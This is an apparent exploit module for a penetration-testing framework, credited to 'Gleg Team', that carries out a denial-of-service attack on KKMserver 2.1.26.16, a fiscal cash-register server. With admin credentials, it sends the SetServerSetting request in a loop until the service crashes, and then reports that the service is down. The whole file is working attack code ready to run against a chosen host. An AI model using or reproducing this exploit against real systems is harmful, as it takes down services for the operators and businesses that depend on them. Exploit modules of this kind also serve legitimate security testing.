from Sploit import Sploit
from collections import OrderedDict
import urllib2
import base64
from socket import timeout

INFO = {}
INFO['NAME'] = "efa_kkmserver_2_1_26_16_dos"
INFO['DESCRIPTION'] = "KKMserver 2.1.26.16 DoS"
INFO['VENDOR'] = "https://kkmserver.ru/"
INFO['CVE Name'] = ""
INFO['NOTES'] = """The server restarts itself on saving settings. 
It is possible to cause an unhandled exception via sending a big amount of requests to save settings.

Authorization is required. Level: admin.
Tested on Windows 7 x64, KKMserver 2.1.26.16.
"""
INFO['DOWNLOAD_LINK'] = "https://kkmserver.ru/KkmServer#Donload"
INFO['LINKS'] = [""]
INFO['CHANGELOG'] = "22 Mar 2019"
INFO['PATH'] = "Exploits/General/"
INFO['AUTHOR'] = "Gleg Team"

OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.215", dict(description='Target host')
OPTIONS["PORT"] = 5893, dict(description='Target port')
OPTIONS["SSL"] = False, dict(description='Use SSL?')
OPTIONS["LOGIN"] = 'admin', dict(description='Login')
OPTIONS["PASSWORD"] = 'admin', dict(description='Password')

class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

        self.name = INFO['NAME']
        self.host = '127.0.0.1'
        self.port = 5893
        self.protocol = 'http'
        self.login = 'admin'
        self.password = 'admin'
        self.headers = {}

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = self.args.get("PORT", self.port)
        self.login = self.args.get("LOGIN", self.login)
        self.password = self.args.get("PASSWORD", self.password)
        self.protocol = 'https' if self.args.get("SSL", False) else 'http'
        self.headers = {'Authorization': 'Basic {}'.format(base64.b64encode(self.login + ':' + self.password))}

    def make_url(self, path):
        return '{}://{}:{}/{}'.format(self.protocol, self.host, self.port, path.strip('\\/'))

    def dos(self):
        url = '/SetServerSetting?ipPort={}&LoginAdmin={}&PassAdmin={}&'.format(self.port, self.login, self.password)  # should save most of your settings
        url += 'LoginUser=user&PassUser=user&'
        url += 'ServerSertificate=&RemoveCommandInterval=30'
        url = self.make_url(url)
        req = urllib2.Request(url, headers=self.headers)
        try:
            urllib2.urlopen(req, timeout=1)
            return True
        except (urllib2.URLError, timeout):
            return False

    def run(self):
        #Get options from gui
        self.args()
        self.log('Starting')
        self.log('[*] Starting dos')
        while self.dos():
            pass
        self.log('[+] Done! The service is down.')
        self.finish(True)



if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()